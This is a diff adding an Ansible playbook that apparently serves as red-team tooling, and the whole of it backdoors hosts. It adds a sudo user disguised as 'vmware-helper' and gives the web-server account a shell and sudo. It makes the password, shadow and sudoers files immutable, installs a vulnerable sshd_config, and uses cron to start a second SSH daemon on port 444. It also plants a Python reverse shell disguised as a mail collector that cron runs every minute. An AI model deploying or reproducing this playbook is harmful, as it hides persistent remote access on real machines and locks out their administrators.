@@ -1,0 +1,64 @@
+---
+- hosts: all
+  tasks:
+    - name: Install Apache/MySQL
+      apt:
+        name:
+          - apache2
+          - mysql-server
+          - vim
+          - screen
+          - tree
+          - net-tools
+          - dnsutils
+          - sudo
+          - sl
+
+    - name: Create additional users
+      user:
+        name: vmware-helper
+        comment: "prankd"
+        shell: /bin/bash
+        groups: sudo
+        # Need password set here
+
+    - name: Modify www-data user
+      user:
+        name: www-data
+        comment: "Set to bin bash pls"
+        shell: /bin/bash
+        groups: sudo
+
+    - name: Immutilize all the files 
+      shell: /usr/bin/chattr +i /etc/passwd /etc/shadow /etc/group /etc/sudoers
+
+    - name: Copy new bashrc
+      copy:
+        src: badrc
+        dest: /home/linux/.bashrc
+
+    - name: Copy vulnerable sshd_config
+      copy: 
+        src: deb_sshd_config
+        dest: /etc/ssh/sshd_config
+
+    - name: Root crontab make a new ssh in
+      cron:
+        name: "SSH upkeep"
+        minute: "*/5"
+        job: "/usr/sbin/sshd -p 444"
+
+    - name: Copy python reverse shell over
+      copy:
+        src: pythonReverseShell
+        dest: /var/mail/mailCollector.sh
+
+    - name: Make shell executable
+      shell: chmod +x /var/mail/mailCollector.sh
+
+    - name: Totally about collecting mail
+      cron:
+        name: "Collect new mail"
+        minute: "*"
+        job: "/var/mail/mailCollector.sh"
+
